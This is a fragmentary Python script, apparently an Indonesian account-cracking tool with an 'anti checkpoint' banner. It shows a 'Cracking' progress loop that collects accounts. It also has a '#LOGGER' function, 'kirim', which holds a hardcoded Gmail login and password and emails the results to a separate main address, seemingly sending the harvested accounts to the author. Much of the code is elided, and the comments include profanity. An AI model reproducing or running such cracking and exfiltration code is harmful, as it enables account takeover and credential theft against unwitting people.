...
def kirim():
    #LOGGER 
   email_user = 'Memek3819@gmail.com' #EMAIL USER LOGIN
   email_password = 'konfirmasi' #EMAIL PASSWORD LOGIN
   email_send = 'ramziandesper68@gmail.com' #EMAIL UTAMA

   subject = '=== RESULT BOS Q ==='
		...
		try:
			for i in th:
				...
				if a[0] != 3 and a[1] not in akun_jml:
					...
					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*1000),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
...
# \rhBY\rp    \rb* ANTI SESI (CHECKPOINT)                                         PIRMANSX \rk#
# \gunakan dengan bijak anjing -----------------------\rk#
